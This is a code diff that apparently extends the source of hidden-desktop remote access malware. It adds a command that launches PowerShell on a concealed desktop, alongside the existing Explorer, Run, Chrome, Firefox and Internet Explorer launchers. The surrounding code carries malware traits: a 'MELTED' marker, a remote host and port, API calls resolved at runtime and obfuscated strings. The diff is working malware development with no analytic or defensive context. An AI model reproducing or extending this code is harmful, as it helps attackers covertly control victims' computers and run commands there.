@@ -7,7 +7,7 @@ enum Input      { mouse };
 static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans   = RGB(255, 174, 201);
 
-enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore };
+enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startFirefox, startIexplore, startPowershell };
 
 static int        g_port;
 static char       g_host[MAX_PATH];
@@ -397,6 +397,19 @@ exit:
    Funcs::pFree(profilesIniContent);
 }
 
+static void StartPowershell()
+{
+    char path[MAX_PATH] = { 0 };
+    Funcs::pLstrcpyA(path, Strs::hd8);
+    Funcs::pLstrcatA(path, Strs::powershell);
+
+    STARTUPINFOA startupInfo = { 0 };
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.lpDesktop = g_desktopName;
+    PROCESS_INFORMATION processInfo = { 0 };
+    Funcs::pCreateProcessA(NULL, path, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
+}
+
 static void StartIe()
 {
    char path[MAX_PATH] = { 0 };
@@ -510,6 +523,11 @@ static DWORD WINAPI InputThread(LPVOID param)
             PROCESS_INFORMATION processInfo = { 0 };
             Funcs::pCreateProcessA(NULL, rundllPath, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
             break;
+         }
+         case WmStartApp::startPowershell:
+         {
+             StartPowershell();
+             break;
          }
          case WmStartApp::startChrome:
          {
